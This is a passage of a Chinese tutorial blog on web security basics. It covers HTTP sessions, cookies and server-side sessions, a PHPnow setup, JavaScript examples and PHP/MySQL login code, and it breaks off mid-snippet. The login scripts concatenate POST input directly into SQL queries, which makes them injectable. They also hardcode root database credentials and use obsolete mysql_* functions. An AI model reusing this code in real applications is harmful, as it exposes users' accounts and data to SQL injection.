title="HTTP会话管理"></a>HTTP会话管理</h2><p>在计算机术语中，<strong>会话是指一个终端用户与交互系统进行通讯的过程</strong>，比如从输入账户密码进入操作系统到退出操作系统就是一个会话过程。</p><p>会话较多用于网络上，<strong>TCP的三次握手</strong>就创建了一个会话，<strong>TCP关闭连接</strong>就是关闭会话。用平述的语言可以解释为：你拔打你女友的电话号码，你女友接听，然后一翻“亲爱的”，直到任何一方挂掉电话，这个过程就是一个会话。你挑逗一只小狗，它跟你互动，也是会话；它不鸟你，那就不形成会话。 </p><p><strong>HTTP协议属于无状态的通信协议</strong>。无状态是指，当浏览器发送请求给服务器的时候，服务器响应，但是当同一个浏览器再发送请求给服务器的时候，他不知道你就是刚才那个浏览器。简单地说，就是服务器不会去记得你，所以是无状态协议。</p><blockquote><p>本质是，<strong>HTTP是短连接的</strong>，请求响应后，断开了TCP连接，下一次连接与上一次无关。</p></blockquote><p>为了识别不同的请求是否来自同一客户，需要引用<font color=red>HTTP会话机制</font>。即：多次HTTP连接间维护用户与同一用户发出的不同请求之间关联的情况称为<strong>维护一个会话（session）</strong>。通过会话管理对会话进行创建、信息存储、关闭等。</p><h3 id="HTTP会话的实现机制"><a href="#HTTP会话的实现机制" class="headerlink" title="HTTP会话的实现机制"></a>HTTP会话的实现机制</h3><p><code>Cookie</code>与<code>session</code>是与HTTP会话相关的两个内容，其中<strong>Cookie存在在浏览器</strong>，<strong>session存储在服务器中</strong>。 </p><p>Cookies是服务器在本地机器上存储的小段文本并<strong>随每一个请求发送至同一个服务器</strong>。网络服务器用<strong>HTTP头</strong>向客户端发送cookies，在客户终端，浏览器解析这些cookies并将它们保存为一个本地文件，它会自动将同一服务器的任何请求附上这些cookies。</p><p>具体来说，cookie机制采用的是在客户端保持状态的方案</p><blockquote><p>它是在用户端的会话状态的存贮机制，<u>需要用户打开客户端的cookie支持</u>。cookie的作用是为了解决HTTP协议无状态的缺陷所作的努力。</p></blockquote><ul><li>正统的cookie分发是通过<strong>扩展HTTP协议</strong>来实现的，服务器通过在HTTP的响应头中加上一行<strong>特殊的指示</strong>以提示浏览器按照指示生成相应的cookie。然而纯粹的客户端脚本如JavaScript也可以生成cookie。而cookie的使用是由浏览器按照一定的原则在后台自动发送给服务器的。</li><li>浏览器检查所有存储的cookie，如果某个cookie所声明的作用范围<strong>大于等于</strong>将要请求的资源所在的位置，则把该cookie附在请求资源的HTTP请求头上发送给服务器。</li></ul><h4 id="cookie的主要内容"><a href="#cookie的主要内容" class="headerlink" title="cookie的主要内容"></a>cookie的主要内容</h4><p>cookie的内容主要包括：名字，值，过期时间，路径和域。<font color=red>路径与域一起构成cookie的作用范围</font>。若不设置过期时间，则表示这个cookie的生命期为浏览器会话期间，关闭浏览器窗口，cookie就消失。这种生命期为浏览器会话期的cookie被称为<strong>会话cookie</strong>。</p><p>会话cookie一般不存储在硬盘上而是保存在内存里，当然这种行为并不是规范规定的。</p><ul><li>若设置了过期时间，浏览器就会把cookie保存到硬盘上，关闭后再次打开浏览器，这些cookie仍然有效直到超过设定的过期时间。</li><li>存储在硬盘上的cookie可以在不同的浏览器进程间共享，比如两个IE窗口。而对于保存在内存里的cookie，不同的浏览器有不同的处理方式。</li></ul><h4 id="Session机制"><a href="#Session机制" class="headerlink" title="Session机制"></a>Session机制</h4><p>Session机制是一种服务器端的机制。</p><p>服务器使用一种类似于<strong>散列表</strong>的结构（也可能就是使用散列表）来保存信息。</p><ul><li>当程序需要为某个客户端的请求创建一个session时，服务器首先检查这个客户端的请求里是否已包含了一个session标识（称为session id），如果已包含则说明以前已经为此客户端创建过session，服务器就按照session id把这个session检索出来使用（检索不到，会新建一个），如果客户端请求不包含session id，则为此客户端创建一个session并且生成一个与此session相关联的session id。</li><li>session id的值应该是一个既不会重复，又不容易被找到规律以仿造的字符串，这个session id将被在本次响应中返回给客户端保存。</li></ul><p>保存这个session id的方式可以采用cookie，这样在交互过程中浏览器可以自动的按照规则把这个标识发挥给服务器。一般这个cookie的名字都是类似于SEEESIONID。所以，一种常见的HTTP会话管理就是，<strong>服务器端通过session来维护客户端的会话状态</strong>，而<strong>在客户端通过cookie来存储当前会话的session id</strong>。</p><blockquote><p>但 cookie 可以被人为的禁止，则必须有其他机制以便在 cookie 被禁止时仍然能够把session id 传递回服务器。经常被使用的一种技术叫做 URL 重写，就是把 session id 直接附加在 URL 路径的后面。还有一种技术叫做表单隐藏字段。就是服务器会自动修改表单，添加一个隐藏字段，以便在表单提交时能够把 session id 传递回服务器</p></blockquote><h1 id="WEB编程环境"><a href="#WEB编程环境" class="headerlink" title="WEB编程环境"></a>WEB编程环境</h1><h2 id="WEB编程语言"><a href="#WEB编程语言" class="headerlink" title="WEB编程语言"></a>WEB编程语言</h2><p>分为WEB静态语言和WEB动态语言，WEB静态语言就是通常所见的超文本标记语言（标准通用标记语言下的一个应用），WEB动态语言主要是ASP、PHP、JAVA、Javascript、CGI等计算机脚本语言编写出来的执行灵活的互联网网页程序。</p><h2 id="WEB环境安装"><a href="#WEB环境安装" class="headerlink" title="WEB环境安装"></a>WEB环境安装</h2><p><strong>PHPnow</strong>是Win32下绿色免费的Apache + PHP + MySQL 环境套件包。简易安装、快速搭建支持虚拟主机的 PHP 环境。附带 <code>PnCp.cmd控制面板</code>，帮助你快速配置你的套件，使用非常方便。<br>PHPnow 是绿色的，解压后执行 Setup.cmd 初始化，即可得到一个 PHP + MySQL 环境。然后就可以直接安装 Discuz!，PHPWind, DeDe, WordPress 等程序。 </p><p><del>具体安装不作详细说明</del></p><p>点击PnCp.cmd，如下：</p><p><img src="/2023/03/16/web-an-quan-ji-chu/1480059edec9c63c8f6ec2e1f1b3fc5d.png" class="lazyload placeholder" data-srcset="/2023/03/16/web-an-quan-ji-chu/1480059edec9c63c8f6ec2e1f1b3fc5d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>选择序号20，即可启动PHPnow。打开网页，访问<a href="http://127.0.0.1如下：">http://127.0.0.1如下：</a></p><p><img src="/2023/03/16/web-an-quan-ji-chu/7daaf6a32257e11b599b5428fe93fc50.png" class="lazyload placeholder" data-srcset="/2023/03/16/web-an-quan-ji-chu/7daaf6a32257e11b599b5428fe93fc50.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>点击phpMyAdmin将进入数据库管理界面，可以自行创建数据库、表以及录入数据等：</p><p><img src="/2023/03/16/web-an-quan-ji-chu/9111df87798a547ed4b4e4a62759db0f.png" class="lazyload placeholder" data-srcset="/2023/03/16/web-an-quan-ji-chu/9111df87798a547ed4b4e4a62759db0f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="JavaScript实践"><a href="#JavaScript实践" class="headerlink" title="JavaScript实践"></a>JavaScript实践</h2><p>使用工具<code>Dreamweaver</code>，来编辑产生一个静态网页，该网页命名为js.htm，存储到PHPnow\htdocs下。</p><p>在网页js.htm中，进行如下四个代码的编辑和运行，可以看到Javascript对浏览器中网页内各元素的读写功能。</p><h3 id="document-write-函数"><a href="#document-write-函数" class="headerlink" title="document.write()函数"></a>document.write()函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">         &lt;head&gt;  </span><br><span class="line">                &lt;title&gt;Javascript简单示例&lt;/title&gt;  </span><br><span class="line">                &lt;script language=&quot;javascript&quot;&gt;    </span><br><span class="line">                            for(i= 1; i &lt;= 100; i++)&#123;  </span><br><span class="line">                                     num= Math.floor(Math.random() * 100);//0-99之间的随机数  </span><br><span class="line">                                     document.write(num,&quot;&quot;);  </span><br><span class="line">                            &#125;   </span><br><span class="line">            &lt;/script&gt;  </span><br><span class="line">         &lt;/head&gt;  </span><br><span class="line">         &lt;body&gt;  </span><br><span class="line">         &lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;  </span><br></pre></td></tr></table></figure><h4 id="单机按钮后调用函数"><a href="#单机按钮后调用函数" class="headerlink" title="单机按钮后调用函数"></a>单机按钮后调用函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">         &lt;head&gt;  </span><br><span class="line">                   &lt;title&gt;Javascript简单示例&lt;/title&gt;  </span><br><span class="line">                   &lt;script language=&quot;javascript&quot;&gt;   </span><br><span class="line">                            function func1()&#123;  </span><br><span class="line">                                     alert(&quot;按钮单击后调用的函数1！&quot;);  </span><br><span class="line">                            &#125;  </span><br><span class="line">                            function func2()&#123;  </span><br><span class="line">                                     alert(&quot;按钮单击后调用的函数2！&quot;);  </span><br><span class="line">                            &#125;   </span><br><span class="line">         &lt;/script&gt;  </span><br><span class="line">         &lt;/head&gt;  </span><br><span class="line">         &lt;body&gt;  </span><br><span class="line">                   &lt;!--单击后调用两个函数用”,“隔开 --&gt;  </span><br><span class="line">                   &lt;input type=&quot;button&quot; value=&quot;单击我&quot; onClick=&quot;func1(), func2()&quot; /&gt;  </span><br><span class="line">         &lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;  </span><br></pre></td></tr></table></figure><h4 id="适用对象：同样使用function"><a href="#适用对象：同样使用function" class="headerlink" title="适用对象：同样使用function"></a>适用对象：同样使用function</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">         &lt;head&gt;  </span><br><span class="line">                   &lt;title&gt;Javascript简单示例&lt;/title&gt;  </span><br><span class="line">         &lt;/head&gt;  </span><br><span class="line">         &lt;body&gt;  </span><br><span class="line">                   &lt;script language=&quot;javascript&quot;&gt;   </span><br><span class="line">                                     function Student(name, school, grade)&#123;  </span><br><span class="line">                                               this.name= name;//注意这里要用this  </span><br><span class="line">                                               this.school=school;  </span><br><span class="line">                                               this.grade= grade;  </span><br><span class="line">                                     &#125;  </span><br><span class="line">                                     hui= new Student(&quot;noting_gonna&quot;, &quot;XX学校&quot;, &quot;小学二年级&quot;);  </span><br><span class="line">                                     //使用with可以省略对象名  </span><br><span class="line">                                     with(hui)&#123;  </span><br><span class="line">                                               document.write(name+ &quot;: &quot; + school + &quot;,&quot; + grade + &quot;&lt;br /&gt;&quot;);  </span><br><span class="line">                                     &#125;  </span><br><span class="line">                                     if(window.hui)&#123;  </span><br><span class="line">                                               document.write(&quot;hui这个对象存在&quot;);  </span><br><span class="line">                                     &#125;  </span><br><span class="line">                                     else  </span><br><span class="line">                                               document.write(&quot;hui这个对象不存在&quot;);   </span><br><span class="line">                   &lt;/script&gt;  </span><br><span class="line">         &lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;  </span><br></pre></td></tr></table></figure><h4 id="获取input-text-中的内容：name-value"><a href="#获取input-text-中的内容：name-value" class="headerlink" title="获取input(text)中的内容：name.value"></a>获取input(text)中的内容：name.value</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;  </span><br><span class="line">         &lt;head&gt;  </span><br><span class="line">                   &lt;title&gt;Javascript简单示例&lt;/title&gt;  </span><br><span class="line">         &lt;/head&gt;  </span><br><span class="line">         &lt;body&gt;  </span><br><span class="line">                   &lt;script language=&quot;javascript&quot;&gt;   </span><br><span class="line">                                    function getLoginMsg()&#123;  </span><br><span class="line">                                               //以下也达到了省略对象名称的作用  </span><br><span class="line">                                               loginMsg= document.loginForm;  </span><br><span class="line">                                            alert(&quot;账号：&quot; +loginMsg.userID.value + &quot;\n&quot; + &quot;密码：&quot; +loginMsg.password.value);  </span><br><span class="line">                                     &#125;  </span><br><span class="line">                                    function setLoginMsg(Object)&#123;  </span><br><span class="line">                                              alert(Object.id);  </span><br><span class="line">                                     &#125;   </span><br><span class="line">                   &lt;/script&gt;  </span><br><span class="line">                   &lt;form name=&quot;loginForm&quot;&gt;  </span><br><span class="line">                            账号：&lt;input type=&quot;text&quot; name=&quot;userID&quot; /&gt;&lt;br /&gt;  </span><br><span class="line">                            密码：&lt;input type=&quot;text&quot; name=&quot;password&quot; /&gt;&lt;br /&gt;  </span><br><span class="line">                            &lt;input type=&quot;button&quot; value=&quot;登录&quot; onclick=&quot;getLoginMsg()&quot; /&gt;  </span><br><span class="line">                            记住密码&lt;input type=&quot;checkbox&quot; id=&quot;这是checkbox的id&quot; onclick=&quot;setLoginMsg(this)&quot; /&gt;  </span><br><span class="line">                   &lt;/form&gt;  </span><br><span class="line">         &lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="PHP与数据库编程"><a href="#PHP与数据库编程" class="headerlink" title="PHP与数据库编程"></a>PHP与数据库编程</h1><h2 id="PHP语言"><a href="#PHP语言" class="headerlink" title="PHP语言"></a>PHP语言</h2><p>PHP是一种免费的脚本语言，主要用途是<strong>处理动态网页</strong>，也包含了命令行运行接口。</p><ul><li>是一种<strong>解释性语言</strong>。是完全免费的，在<a href="http://www.php.net下载,遵循gpl.php的语法和c/C++%EF%BC%8CJava%EF%BC%8CPerl%EF%BC%8CASP%EF%BC%8CJSP%E6%9C%89%E7%9B%B8%E9%80%9A%E4%B9%8B%E5%A4%84%E5%B9%B6%E4%B8%94%E5%8A%A0%E4%B8%8A%E4%BA%86%E8%87%AA%E5%B7%B1%E7%9A%84%E8%AF%AD%E6%B3%95%E3%80%82">http://www.php.net下载，遵循GPL。PHP的语法和C/C++，Java，Perl，ASP，JSP有相通之处并且加上了自己的语法。</a></li><li>由于PHP是一种<strong>面向HTML的解析语言</strong>，所以，PHP语句被包含在PHP标记里面，PHP标记外的语句都被直接输出。包括在PHP标记中的语句被解析，在其外的语句原样输出并且接受PHP语句的控制。</li></ul><h3 id="四种标记"><a href="#四种标记" class="headerlink" title="四种标记"></a>四种标记</h3><p><img src="/2023/03/16/web-an-quan-ji-chu/75671bec26aa4a6dfa9c074453bd1905.png" class="lazyload placeholder" data-srcset="/2023/03/16/web-an-quan-ji-chu/75671bec26aa4a6dfa9c074453bd1905.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>PHP需要在每个语句后用分号结束，在一个PHP代码段中的最后一行可以不用分号结束。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>使用注释可以增加语言的可读性，PHP支持三种C/C++、perl、unix-shell风格的注释：</p><p>#      ——Perl式的单行注释</p><p>//     ——C++式的单行注释</p><p>/* */ ——C/C++式多行注释</p><h3 id="变量解析"><a href="#变量解析" class="headerlink" title="变量解析"></a>变量解析</h3><p>变量解析当遇到符号$时产生，解析器会尽可能多地取得后面的字符以组成一个合法的变量名，然后将变量值替换他们，如果$后面没有有效的变量名，则输出”$”。如果想明确的变量名可以用<strong>花括号</strong>把变量名括起来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> $username = “liuzheli”; </span><br><span class="line"> $SQLStr = &quot;SELECT * FROM userinfo where username=&#x27;$username&#x27;&quot;; </span><br><span class="line"> echo $SQLStr ; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在对上述php段进行解析时，第一个$标识的username将被解析为一个变量，因为第一次定义，将分配内存空间被赋以初值liuzheli。在第二个标识的变量SQLStr的初值中，因为$username已经被解析为变量，所以，最终显示的结果将是：SELECT * FROM userinfo where username=’ liuzheli ‘。</p><blockquote><p>同样也可以解析数组索引或者对象属性。对于数组索引，右方括号（]）标志着索引的结束。对象属性则和简单变量适用同样的规则。</p></blockquote><h2 id="一个简单的WEB程序"><a href="#一个简单的WEB程序" class="headerlink" title="一个简单的WEB程序"></a>一个简单的WEB程序</h2><p>使用工具Dreamweaver来编辑产生一个静态网页，该网页命名为login.htm，存储到PHPnow\htdocs下。</p><blockquote><p>htdocs是PHPnow的web应用的根目录。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=&quot;form1&quot; name=&quot;form1&quot; method=&quot;post&quot; action=&quot;loginok.php&quot;&gt;</span><br><span class="line">  &lt;table width=&quot;900&quot; border=&quot;0&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td height=&quot;20&quot;&gt;姓名&lt;/td&gt;</span><br><span class="line">      &lt;td height=&quot;20&quot;&gt;&lt;label&gt;</span><br><span class="line">        &lt;input name=&quot;username&quot; type=&quot;text&quot; id=&quot;username&quot; /&gt;</span><br><span class="line">      &lt;/label&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">      &lt;td height=&quot;20&quot;&gt;口令&lt;/td&gt;</span><br><span class="line">      &lt;td height=&quot;20&quot;&gt;&lt;label&gt;</span><br><span class="line">        &lt;input name=&quot;pwd&quot; type=&quot;password&quot; id=&quot;pwd&quot; /&gt;</span><br><span class="line">      &lt;/label&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">      &lt;td height=&quot;20&quot;&gt;&amp;nbsp;&lt;/td&gt;</span><br><span class="line">      &lt;td height=&quot;20&quot;&gt;&lt;label&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;Submit&quot; value=&quot;提交&quot; /&gt;</span><br><span class="line">      &lt;/label&gt;&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">  &lt;/table&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p><strong>Form表单</strong>：表单是一个包含表单元素的区域。表单区域里包含了两个文本框（<input>）、一个确认按钮(submit) 。确认按钮的作用是当用户单击确认按钮时，表单的内容会被传送到另一个文件。</p><p><strong>表单属性</strong>：表单的动作属性(action)定义了目的文件的文件名。由动作属性定义的这个文件通常会对接收到的输入数据进行相关的处理。在上面的表单中定义了接受表单输入的处理文件为“loginok.php”。method属性指定了与服务器进行信息交互的方法为POST。</p><h2 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h2><p>HTTP定义了与服务器交互的不同方法，最基本的方法有4种：GET、POST、PUT、DELETE。</p><p>URL全称是资源描述符，我们可以这样认为：一个URL地址，它用于描述一个网络上的资源，而HTTP中的GET、POST、PUT、DELETE就对应着对这个资源的查，改，增，删4个操作。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息，早期的系统由于不支持DELETE，因此PUT和DELETE用的较少。</p><p>处理提交输入的第一个php文件代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> $username = $_POST[&#x27;username&#x27;];</span><br><span class="line"> $pwd = $_POST[&#x27;pwd&#x27;];</span><br><span class="line"> $SQLStr = &quot;SELECT * FROM userinfo where username=&#x27;$username&#x27; and pwd=&#x27;$pwd&#x27;&quot;; </span><br><span class="line"> echo $SQLStr ; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><font color=red>搭建环境，将表单的输入改为GET，php的程序也改为GET，看看变化在哪里？</font></p><p>具体地，POST和GET的区别如下：</p><ul><li>GET请求的数据会附在URL之后<blockquote><p>（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，参数之间以&amp;相连，如：login.action?name=sean&amp;password=123。 </p></blockquote></li><li>POST把提交的数据则放置在是HTTP包的包体中<blockquote><p>POST的安全性要比GET的安全性高：<br>1.GET模式下，通过URL就可以作数据修改<br>2.GET模式下，用户名和密码将明文出现在URL上，因为登录页面有可能被浏览器缓存、其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了<br>3.GET模式下，提交数据还可能会造成跨站请求伪造攻击</p></blockquote></li></ul><h2 id="PHP连接数据库"><a href="#PHP连接数据库" class="headerlink" title="PHP连接数据库"></a>PHP连接数据库</h2><h3 id="建表"><a href="#建表" class="headerlink" title="建表"></a>建表</h3><p>在myDB库中，设有一个表userinfo，包含两个字段，即username、pwd。</p><p>假设在上述login.php中实现对输入的用户名和密码进行认证，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> $conn=mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;123456&quot;);  //连接数据库</span><br><span class="line"> $username = $_POST[&#x27;username&#x27;];</span><br><span class="line"> $pwd = $_POST[&#x27;pwd&#x27;];</span><br><span class="line"> $SQLStr = &quot;SELECT * FROM userinfo where username=&#x27;$username&#x27; and pwd=&#x27;$pwd&#x27;&quot;;  echo $SQLStr ;</span><br><span class="line"> $result=mysql_db_query(&quot;MyDB&quot;, $SQLStr, $conn); //执行数据库SQL语句</span><br><span class="line">if ($row=mysql_fetch_array($result))//读取数据内容   </span><br><span class="line">          echo &quot;&lt;br&gt;OK&lt;br&gt;&quot;;</span><br><span class="line">  else </span><br><span class="line">          echo &quot;&lt;br&gt;false&lt;br&gt;&quot;;</span><br><span class="line">mysql_free_result($result); // 释放资源</span><br><span class="line">mysql_close($conn); // 关闭连接</span><br><span class="line">// 登陆成功则显示ok否则显示false</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="数据库应用开发三步骤"><a href="#数据库应用开发三步骤" class="headerlink" title="数据库应用开发三步骤"></a>数据库应用开发三步骤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//1. 连接数据库：</span><br><span class="line">$conn=mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;123456&quot;);</span><br><span class="line">//2. 执行SQL操作：</span><br><span class="line">$result=mysql_db_query(&quot;MyDB&quot;, $SQLStr, $conn);</span><br><span class="line">//3. 关闭连接：</span><br><span class="line">mysql_free_result($result); mysql_close($conn); </span><br></pre></td></tr></table></figure><h3 id="查询数据后显示数据"><a href="#查询数据后显示数据" class="headerlink" title="查询数据后显示数据"></a>查询数据后显示数据</h3><p>数据库的操作主要依赖于SQL语句，查询数据并显示的一个例子如示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">  // 定位到第一条记录</span><br><span class="line">    mysql_data_seek($result, 0);</span><br><span class="line">    // 循环取出记录</span><br><span class="line">    while ($row=mysql_fetch_row($result))</span><br><span class="line">    &#123; </span><br><span class="line">      for ($i=0; $i&lt;mysql_num_fields($result); $i++ )</span><br><span class="line">      &#123; </span><br><span class="line">        echo $row[$i];</span><br><span class="line">        echo &quot;   |   &quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>创建show.php来演示验证：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> $conn=mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;123456&quot;);  //连接数据库 </span><br><span class="line"> $SQLStr = &quot;SELECT * FROM userinfo  &quot;;  //echo $SQLStr ;</span><br><span class="line"> $result=mysql_db_query(&quot;MyDB&quot;, $SQLStr, $conn); //执行数据库SQL语句</span><br><span class="line"> // 定位到第一条记录</span><br><span class="line">    mysql_data_seek($result, 0);</span><br><span class="line">    // 循环取出记录</span><br><span class="line">    while ($row=mysql_fetch_row($result))</span><br><span class="line">    &#123; </span><br><span class="line">      for ($i=0; $i&lt;mysql_num_fields($result); $i++ )</span><br><span class="line">      &#123; </span><br><span class="line">        echo $row[$i];</span><br><span class="line">        echo &quot;   |   &quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">mysql_free_result($result); // 释放资源</span><br><span class="line">mysql_close($conn); // 关闭连接</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="Cookie实战"><a href="#Cookie实战" class="headerlink" title="Cookie实战"></a>Cookie实战</h1><p><strong>Cookie和session</strong></p><p>共性：都可以暂时保存在多个页面中使用的变量。<br>区别：cookie存放客户端浏览器，session保存在服务器。它们之间的联系是session ID一般保存在cookie中，来实现HTTP会话管理。</p><p><strong>Cookie工作原理</strong></p><p>生成Cookie：当客户访问某网站时，PHP可以使用setcookie函数告诉浏览器生成一个cookie，并把这个cookie保存在c:\Documents and Settings\用户名\Cookies目录下。</p><p>使用Cookie：Cookie是HTTP标头的一部分，当客户再次访问该网站时，浏览器会自动把与该站点对应的cookie发送到服务器，服务器则把从客户端传来的cookie将自动地转化成一个PHP变量。</p><p><strong>SetCookie函数</strong></p><p>对 cookie 进行赋值的函数为setcookie，赋值成功返回 true，否则返回 false。<br>函数原型如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">setcookie(name, value, expire, path, domain, secure)</span><br><span class="line">name 必需。规定 cookie 的名称。</span><br><span class="line">value 必需。规定 cookie 的值。</span><br><span class="line">expire 可选。规定 cookie 的有效期。</span><br><span class="line">举例，time()+3600*24*30 将设置 cookie 的过期时间为 30 天。 </span><br><span class="line">secure 可选。规定是否通过安全的 HTTPS 连接来传输 cookie。</span><br><span class="line">domain 可选。规定 cookie 的域名。</span><br><span class="line">path 可选。规定 cookie 的路径。</span><br></pre></td></tr></table></figure><p><strong>如下实例设置COOKIE</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> if ($row=mysql_fetch_array($result))//读取数据内容  </span><br><span class="line"> &#123;</span><br><span class="line">      